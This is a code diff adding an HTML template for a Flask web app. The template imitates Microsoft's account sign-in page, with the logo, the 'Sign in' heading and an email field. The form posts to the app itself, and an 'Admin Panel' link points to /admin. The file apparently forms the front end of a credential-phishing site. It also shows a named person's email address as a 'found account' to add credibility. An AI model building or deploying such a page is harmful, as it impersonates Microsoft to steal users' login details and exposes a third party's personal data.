@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+    <div class="wrapper">
+
+        <!-- Main Card -->
+        <div class="card">
+
+            <!-- Microsoft Logo -->
+            <div class="ms-logo">
+                <svg width="21" height="21" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
+                    <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
+                    <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
+                    <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
+                </svg>
+                <span>Microsoft</span>
+            </div>
+
+            <h1 class="heading">Sign in</h1>
+
+            <form method="POST" action="/">
+
+                <div class="input-group">
+                    <input
+                        type="text"
+                        id="email"
+                        name="email"
+                        class="input-field {% if error %}error{% endif %}"
+                        placeholder=" "
+                        autocomplete="off"
+                        required
+                    />
+                    <label for="email" class="floating-label">Email, phone, or Skype</label>
+
+                    {% if error %}
+                    <p class="input-error">{{ error }}</p>
+                    {% endif %}
+                </div>
+
+                <div class="links">
+                    <p>No account? <a href="#">Create one!</a></p>
+                    <a href="#">Can't access your account?</a>
+                </div>
+
+                <div class="btn-group">
+                    <button type="button" class="btn btn-back">Back</button>
+                    <button type="submit" class="btn btn-next">Next</button>
+                </div>
+
+            </form>
+
+        </div>
+
+        <!-- Sign-in options -->
+        <div class="card sign-in-options">
+            <span>🔑</span>
+            <a href="#">Sign-in options</a>
+        </div>
+
+        <!-- Found account -->
+        <div class="card found-account">
+            <p class="found-text">We found an account you can use here:</p>
+            <div class="account-row">
+                <div class="avatar">
+                    <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="16" cy="16" r="16" fill="#c8c8c8"/>
+                        <circle cx="16" cy="13" r="6" fill="#888"/>
+                        <ellipse cx="16" cy="28" rx="10" ry="7" fill="#888"/>
+                    </svg>
+                </div>
+                <div class="account-info">
+                    <span class="account-name">Taunya Bondra</span>
+                    <span class="account-email">tbondra@hotmail.com</span>
+                    <span class="account-status">Signed in</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Admin Link -->
+        <div style="text-align:center; padding: 10px;">
+            <a href="/admin" style="font-size:12px; color:#888; text-decoration:none;">Admin Panel</a>
+        </div>
+
+    </div>
+</body>
+</html>
